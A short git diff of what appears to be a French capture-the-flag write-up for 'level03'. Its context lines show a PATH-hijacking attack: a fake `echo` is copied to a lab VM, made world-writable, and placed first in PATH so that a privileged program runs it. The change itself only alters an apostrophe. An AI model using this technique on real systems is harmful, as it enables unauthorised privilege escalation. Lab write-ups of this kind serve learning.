@@ -29,7 +29,7 @@ On peux voir qu'il utilise l'enviromnent pour appeler `echo`, on as donc crée u
 ```shell
 ~ mkdir /tmp/myPath
 ~ scp -P 4242 echo level03@192.168.56.101:/tmp/myPath
-level03@192.168.56.101's password:
+level03@192.168.56.101 s password:
 echo                                            100%   25    33.6KB/s   00:00
 ~ chmod 777 /tmp/myPath/echo
 ~ export PATH=/tmp/myPath:$PATH
